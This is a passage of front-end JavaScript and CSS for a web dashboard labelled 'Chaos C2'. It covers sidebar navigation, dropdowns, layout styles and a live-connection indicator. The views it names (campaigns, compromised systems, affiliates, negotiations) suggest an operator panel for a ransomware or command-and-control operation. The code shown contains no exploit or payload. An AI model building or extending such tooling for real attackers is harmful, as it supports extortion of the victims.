    el.classList.toggle('sidebar-link-active', el.onclick?.toString().includes(view));
  });
  
  // Initialize view-specific content
  if (view === 'dashboard') {
    setTimeout(initCharts, 100);
  } else if (view === 'campaigns') {
    renderCampaignsTable();
  } else if (view === 'systems') {
    renderSystemsTable();
  } else if (view === 'affiliates') {
    renderAffiliatesTable();
  } else if (view === 'negotiations') {
    renderNegotiationsList();
  } else if (view === 'analytics') {
    setTimeout(initAnalyticsCharts, 100);
  }
  
  closeSidebar();
}

function toggleSidebar() {
  state.sidebarOpen = !state.sidebarOpen;
  document.getElementById('sidebar').classList.toggle('open', state.sidebarOpen);
  document.getElementById('sidebar-overlay').classList.toggle('open', state.sidebarOpen);
}

function closeSidebar() {
  state.sidebarOpen = false;
  document.getElementById('sidebar').classList.remove('open');
  document.getElementById('sidebar-overlay').classList.remove('open');
}

// ===== UTILITIES =====
function toggleDropdown(id) {
  document.querySelectorAll('.dropdown').forEach(d => {
    if (d.id !== id) d.classList.remove('open');
  });
  document.getElementById(id)?.parentElement?.classList.toggle('open');
}

document.addEventListener('click', (e) => {
  if (!e.target.closest('.dropdown')) {
    document.querySelectorAll('.dropdown').forEach(d => d.classList.remove('open'));
  }
});

function logout() {
  if (confirm('Log out?')) {
    window.location.href = '/logout';
  }
}

// ===== INITIALIZATION =====
function init() {
  // Inject styles
  const styleEl = document.createElement('style');
  styleEl.textContent = componentStyles + `
    /* Layout */
    .app-layout { display: grid; grid-template-columns: 280px 1fr; min-height: 100vh; }
    .sidebar { background: var(--colors-bg-elevated); border-right: 1px solid var(--colors-border); padding: 0; display: flex; flex-direction: column; position: fixed; left: 0; top: 0; bottom: 0; z-index: 100; width: 280px; transition: transform var(--transitions-normal); }
    .sidebar-header { padding: 20px; border-bottom: 1px solid var(--colors-border); }
    .sidebar-nav { flex: 1; padding: 12px; overflow-y: auto; }
    .sidebar-link { display: flex; align-items: center; gap: 12px; padding: 12px 16px; border-radius: 10px; color: var(--colors-text-muted); text-decoration: none; transition: all var(--transitions-fast); margin-bottom: 4px; }
    .sidebar-link:hover { background: var(--colors-surface); color: var(--colors-text); }
    .sidebar-link-active { background: var(--colors-primary-light); color: var(--colors-primary); border-left: 3px solid var(--colors-primary); }
    .sidebar-footer { padding: 8px; }
    .sidebar-overlay { display: none; position: fixed; inset: 0; background: rgba(0,0,0,0.5); z-index: 99; }
    .sidebar.open { transform: translateX(0); }
    .sidebar-overlay.open { display: block; }
    
    .main-content { grid-column: 2; display: flex; flex-direction: column; min-height: 100vh; }
    .topbar { background: var(--colors-bg-elevated); border-bottom: 1px solid var(--colors-border); padding: 16px 24px; display: flex; justify-content: space-between; align-items: center; position: sticky; top: 0; z-index: 50; }
    .page-content { flex: 1; padding: 24px; overflow-y: auto; }
    
    /* Toggle */
    .toggle { position: relative; width: 48px; height: 28px; }
    .toggle input { opacity: 0; width: 0; height: 0; }
    .toggle-slider { position: absolute; inset: 0; background: var(--colors-border); border-radius: 28px; transition: var(--transitions-normal); cursor: pointer; }
    .toggle-slider::before { content: ''; position: absolute; width: 22px; height: 22px; left: 3px; top: 3px; background: white; border-radius: 50%; transition: var(--transitions-normal); box-shadow: var(--shadows-sm); }
    .toggle input:checked + .toggle-slider { background: var(--colors-primary); }
    .toggle input:checked + .toggle-slider::before { transform: translateX(20px); }
    
    /* Responsive */
    @media (max-width: 1024px) {
      .sidebar { transform: translateX(-100%); }
      .sidebar.open { transform: translateX(0); }
      .sidebar-overlay.open { display: block; }
      .main-content { grid-column: 1; }
    }
    
    /* Fade In */
    .fade-in { animation: fadeIn 0.4s ease-out; }
  `;
  
  // Page content
  const app = document.getElementById('app');
  app.innerHTML = `
    <div class="app-layout">
      <aside class="sidebar" id="sidebar">
        <div class="sidebar-header">
          <div class="flex items-center gap-3">
            <div class="avatar" style="background: linear-gradient(135deg, var(--colors-primary), var(--colors-primary-hover));">${createIcon('target', 24)}</div>
            <div>
              <h2 style="font-size: 1.25rem; font-weight: 700;">Chaos C2</h2>
              <p class="text-muted" style="font-size: 0.75rem;">v3.2.1 • Live</p>
            </div>
          </div>
        </div>
        <nav class="sidebar-nav" id="sidebar-nav"></nav>
        <div class="sidebar-footer">
          <div class="flex items-center gap-3 p-4 border-t" style="border-color: var(--colors-border);">
            <div class="w-2 h-2 rounded-full bg-success" id="conn-indicator"></div>
            <div class="flex-1 min-w-0">
              <p style="font-size: 0.6875rem; font-weight: 500; color: var(--colors-text-muted);">Connection</p>
              <p id="conn-status" style="font-size: 0.6875rem; color: var(--colors-text-muted);">Connecting...</p>
            </div>
          </div>
        </div>
      </aside>
      <div class="sidebar-overlay" id="sidebar-overlay" onclick="toggleSidebar()"></div>
      <main class="main-content">
        <header class="topbar">
          <div class="flex items-center gap-4">
            <button class="btn btn-ghost btn-icon" onclick="toggleSidebar()" aria-label="Menu">${createIcon('menu', 24)}</button>
            <h1 id="page-title" style="font-size: 1.5rem; font-weight: 700;">Dashboard</h1>
          </div>
          <div class="flex items-center gap-3">
            <div class="dropdown">
              <button class="btn btn-ghost btn-icon" onclick="toggleDropdown('notif-dropdown')">${createIcon('bell', 22)}</button>
              <div class="dropdown-menu" id="notif-dropdown" style="width: 360px; right: 0;">
                <div class="p-3 border-b" style="border-color: var(--colors-border);">
                  <h4 style="font-size: 0.8125rem; font-weight: 600;">Notifications</h4>
                </div>
                <div class="max-h-96 overflow-auto" id="notifications-list"></div>
                <div class="p-3 border-t" style="border-color: var(--colors-border);">
                  <button class="btn btn-ghost btn-sm w-full">View All</button>
                </div>
              </div>
            </div>
            <div class="dropdown">
              <button class="btn btn-ghost" onclick="toggleDropdown('user-dropdown')" style="gap: 8px;">
                <div class="avatar avatar-sm" style="background: linear-gradient(135deg, var(--colors-primary), var(--colors-primary-hover));">${state.user.avatar}</div>
                <span style="font-size: 0.8125rem; font-weight: 500;">${state.user.name}</span>
                ${createIcon('chevronDown', 16)}
              </button>
              <div class="dropdown-menu" id="user-dropdown" style="right: 0; min-width: 200px;">
                <div class="p-3 border-b" style="border-color: var(--colors-border);">
                  <p style="font-weight: 600;">${state.user.name}</p>
                  <p class="text-muted" style="font-size: 0.75rem;">${state.user.role}</p>
                </div>
                <div class="dropdown-item" onclick="navigate('settings')">${createIcon('settings', 16)} Settings</div>
                <div class="dropdown-divider"></div>
                <div class="dropdown-item text-danger" onclick="logout()">${createIcon('lock', 16)} Logout</div>
              </div>
            </div>
          </div>
        </header>
        <div class="page-content" id="page-content"></div>
      </main>
    </div>
    <div id="modals-container"></div>
  `;
  
  // Init
  renderSidebar();
  navigate('dashboard');
  initSSE();
  
  // Mobile menu toggle
  window.toggleSidebar = toggleSidebar;
  window.navigate = navigate;
  window.toggleSidebar = toggleSidebar;
  window.toggleDropdown = (id) => {
    document.querySelectorAll('.dropdown').forEach(d => {
      if (d.id !== id) d.classList.remove('open');
    });
    document.getElementById(id)?.parentElement?.classList.toggle('open');
  };
  window.logout = () => { if (confirm('Log out?')) window.location.href = '/logout'; };
  
  // Close dropdowns on outside click
  document.addEventListener('click', (e) => {
    if (!e.target.closest('.dropdown')) {
      document.querySelectorAll('.dropdown').forEach(d => d.classList.remove('open'));
    }
  });
  
  // Keyboard shortcuts
  document.addEventListener('keydown', (e) => {
    if (e.key === 'Escape') {
      document.querySelectorAll('.dropdown, .modal-overlay.open').forEach(el => el.classList.remove('open'));
      closeSidebar();
    }
    if (e.ctrlKey && e.key === 'k') {
      e.preventDefault();
      // Focus search
    }
  });
}

// Start app when DOM ready
if (document.readyState === 'loading') {
  document.addEventListener('DOMContentLoaded', init);
} else {
  init();
}

// Export for debugging
window.__CHAOS_C2__ = { state, navigate };